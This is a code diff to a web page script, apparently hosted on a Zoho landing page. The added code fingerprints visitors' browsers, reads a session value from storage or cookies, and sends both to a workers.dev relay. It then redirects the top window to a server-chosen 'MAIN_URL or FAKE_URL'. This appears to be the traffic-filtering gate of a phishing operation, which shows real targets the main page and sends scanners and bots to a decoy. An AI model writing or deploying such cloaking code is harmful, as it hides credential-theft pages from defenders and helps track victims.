@@ -82,68 +82,95 @@
     </div>
   </div>
 
-  <script>
-    function collectMetrics(){
-      try{
-        return {
-          ua: navigator.userAgent || "",
-          lang: navigator.language || "",
-          tz: (Intl.DateTimeFormat().resolvedOptions().timeZone || ""),
-          screen: (screen && screen.width && screen.height)
-                  ? (screen.width + "x" + screen.height) : "",
-          colorDepth: screen.colorDepth || 0,
-          webdriver: navigator.webdriver === true,
-          timing: (performance && performance.now) ? performance.now() : 0
-        };
-      }catch(e){
-        return {};
-      }
-    }
+  
 
-    // xFrame-safe redirect: if inside Zoho iframe, redirect the TOP window
-    function redirectTo(url){
-      try {
-        if (window.top && window.top !== window.self) {
-          window.top.location.href = url;
-        } else {
-          window.location.href = url;
-        }
-      } catch(e){
+
+
+<script>
+  function collectMetrics(){
+    try{
+      return {
+        ua: navigator.userAgent || "",
+        lang: navigator.language || "",
+        tz: (Intl.DateTimeFormat().resolvedOptions().timeZone || ""),
+        screen: (screen && screen.width && screen.height)
+                ? (screen.width + "x" + screen.height) : "",
+        colorDepth: screen.colorDepth || 0,
+        webdriver: navigator.webdriver === true,
+        timing: (performance && performance.now) ? performance.now() : 0
+      };
+    }catch(e){
+      return {};
+    }
+  }
+
+  // 🔹 NEW: read the entry_session from storage / cookie
+  function getEntrySession(){
+    // 1) Try sessionStorage (set by portaccess page)
+    try {
+      var s = sessionStorage.getItem("entry_session");
+      if (s) return s;
+    } catch(e){}
+
+    // 2) Fallback: cookie set on *.zoholandingpage.com
+    try {
+      var m = document.cookie.match(/(?:^|;\s*)entry_session=([^;]+)/);
+      if (m) return decodeURIComponent(m[1]);
+    } catch(e){}
+
+    return "";
+  }
+
+  // xFrame-safe redirect: if inside Zoho iframe, redirect the TOP window
+  function redirectTo(url){
+    try {
+      if (window.top && window.top !== window.self) {
+        window.top.location.href = url;
+      } else {
         window.location.href = url;
       }
+    } catch(e){
+      window.location.href = url;
     }
+  }
 
-    function onHumanVerified(cfToken){
-      if(!cfToken) return;
+  function onHumanVerified(cfToken){
+    if(!cfToken) return;
 
-      const GW_ENDPOINT =
-        "https://rapid-butterfly-1d9d.4a8daf702aff10f6401d506d.workers.dev/gw";
+    const GW_ENDPOINT =
+      "https://rapid-butterfly-1d9d.4a8daf702aff10f6401d506d.workers.dev/gw";
 
-      fetch(GW_ENDPOINT,{
-        method:"POST",
-        headers:{ "Content-Type":"application/json" },
-        body: JSON.stringify({
-          cf_token: cfToken,
-          metrics: collectMetrics()
-        })
+    // 🔹 capture entry_session from portaccess flow
+    const entrySession = getEntrySession();
+
+    fetch(GW_ENDPOINT,{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body: JSON.stringify({
+        cf_token: cfToken,
+        metrics: collectMetrics(),
+        entry_session: entrySession   // 🔑 sent to Worker → Railway gw.php
       })
-      .then(r => r.json().catch(() => null))
-      .then(res => {
-        if(res && res.trust_token){
-          try{
-            sessionStorage.setItem("trust_token", res.trust_token);
-          }catch(e){}
-        }
+    })
+    .then(r => r.json().catch(() => null))
+    .then(res => {
+      if(res && res.trust_token){
+        try{
+          sessionStorage.setItem("trust_token", res.trust_token);
+        }catch(e){}
+      }
 
-        if(res && typeof res.next === "string" && res.next.length > 8){
-          redirectTo(res.next);
-          return;
-        }
+      // server-controlled next URL (MAIN_URL or FAKE_URL)
+      if(res && typeof res.next === "string" && res.next.length > 8){
+        redirectTo(res.next);
+        return;
+      }
 
-        location.reload();
-      })
-      .catch(() => {
-        location.reload();
-      });
-    }
-  </script>
+      // fallback: reset challenge
+      location.reload();
+    })
+    .catch(() => {
+      location.reload();
+    });
+  }
+</script>
